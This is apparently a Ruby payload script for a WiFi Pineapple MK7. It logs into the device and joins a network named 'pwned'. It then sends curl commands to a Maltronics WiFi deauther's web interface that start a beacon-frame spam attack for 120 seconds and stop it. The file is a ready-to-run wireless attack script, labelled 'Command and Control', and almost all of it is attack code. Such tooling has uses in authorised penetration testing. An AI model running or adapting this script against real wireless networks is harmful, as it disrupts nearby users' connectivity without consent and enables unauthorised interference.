#
# Title:            Maltronics - WiFi Deauther
#
# Description:      Spam beacon frames with
#                   https://maltronics.com/products/wifi-deauther
#
# Author:           TW-D
# Version:          1.0
# Category:         Command and Control
#

require_relative('../../classes/PineappleMK7.rb')

system_authentication = PineappleMK7::System::Authentication.new
system_authentication.host = "172.16.42.1"
system_authentication.port = 1471
system_authentication.mac = "00:13:37:DD:EE:FF"
system_authentication.password = "<ROOT-ACCOUNT-PASSWORD>"

if (system_authentication.login)

    led = PineappleMK7::System::LED.new

    # SETUP
    #
    led.setup

    CLIENT_INTERFACE = 'wlan2'

    DEAUTHER_NETWORK = 'pwned'
    DEAUTHER_PASSWORD = 'deauther'
    DEAUTHER_ADDRESS = '192.168.4.2'

    BEACON_TIME = 120

    settings_networking = PineappleMK7::Modules::Settings::Networking.new

    settings_networking.client_disconnect(CLIENT_INTERFACE)

    output = settings_networking.client_scan(CLIENT_INTERFACE)
    (output.results).each do |network|
        if (network.ssid == DEAUTHER_NETWORK)
            network.password = DEAUTHER_PASSWORD
            settings_networking.client_connect(network, CLIENT_INTERFACE)
        end
    end

    sleep(30)
    
    # ATTACK
    #
    led.attack

    puts('[+] Spam beacon frames')

    `curl -s 'http://#{DEAUTHER_ADDRESS}/run?cmd=attack%20-b' -H 'Accept: */*' -H 'Connection: keep-alive'`

    # SPECIAL
    #
    led.special

    sleep(BEACON_TIME)

    # FINISH
    #
    led.finish

    `curl -s 'http://#{DEAUTHER_ADDRESS}/run?cmd=attack' -H 'Accept: */*' -H 'Connection: keep-alive'`

    # CLEANUP
    #
    led.cleanup

    settings_networking.client_disconnect(CLIENT_INTERFACE)

    # OFF
    #
    led.off

end